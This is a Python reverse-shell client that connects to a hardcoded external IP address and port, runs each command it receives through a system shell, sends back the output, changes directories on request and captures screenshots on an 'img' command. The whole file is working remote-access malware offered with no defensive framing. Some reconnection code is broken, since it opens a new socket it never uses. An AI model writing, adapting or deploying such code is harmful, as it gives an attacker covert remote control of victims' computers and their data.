import socket
import os
import subprocess
import time
from PIL import ImageGrab

host = '3.209.239.80'
port = 9999
print(host)

def main():
    try:
        s = socket.socket()
        s.connect((host, port))
        print(port)
        connected = True 
        while True:
            try:
                data = s.recv(1024)
                if data[:2].decode("utf-8") == 'cd':
                    try:
                        os.chdir(data[3:].decode("utf-8"))
                    except socket.error:
                        connected = False          
                        clientSocket = socket.socket()          
                        print( "connection lost... reconnecting" )
                        while not connected:
                            try:
                                clientSocket.connect( ( host, port ) )                  
                                connected = True                  
                                print( "re-connection successful" )
                            except socket.error:                  
                                time.sleep(2)
                    except:
                        print("exception occured in cd ")
                if data[:3].decode("utf-8") == 'img':
                    try:
                        snapshot = ImageGrab.grab()
                        save_path = "C:\\Users\\hp\\Documents\\Bank Management C++\\banksystem C++\\im.jpg"
                        snapshot.save(save_path)
                        time.sleep(1)
                        

                    except:
                        print("exception occured in img ")
                if data[:].decode("utf-8") == 'test':
                    output_str='test'
                    s.send(str.encode(output_str))
                    #print(output_str)
                    continue
                if len(data) > 0:
                    try:
                        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                        output_byte = cmd.stdout.read() + cmd.stderr.read()
                        output_str = str(output_byte,"utf-8")
                        currentWD = os.getcwd() + "> "
                        if(output_str=='' or output_str==None):
                            output_str='empty' +'\n'
                        
                        s.send(str.encode(output_str + currentWD))
                        print(output_str)
                    except socket.error:
                        connected = False          
                        clientSocket = socket.socket()          
                        print( "connection lost... reconnecting" )
                        while not connected:
                            try:
                                clientSocket.connect( ( host, port ) )                  
                                connected = True                  
                                print( "re-connection successful" )
                            except socket.error:                  
                                time.sleep(2)
                    except:
                        print("excceptiion occured processing")
            except socket.error:
                        connected = False          
                        clientSocket = socket.socket()          
                        print( "connection lost... reconnecting" )
                        while not connected:
                            try:
                                clientSocket.connect( ( host, port ) )                  
                                connected = True                  
                                print( "re-connection successful" )
                            except socket.error:                  
                                time.sleep(2)

    except:
        
        print("excceptiion occured")
        time.sleep(5)
        main()
        
main()
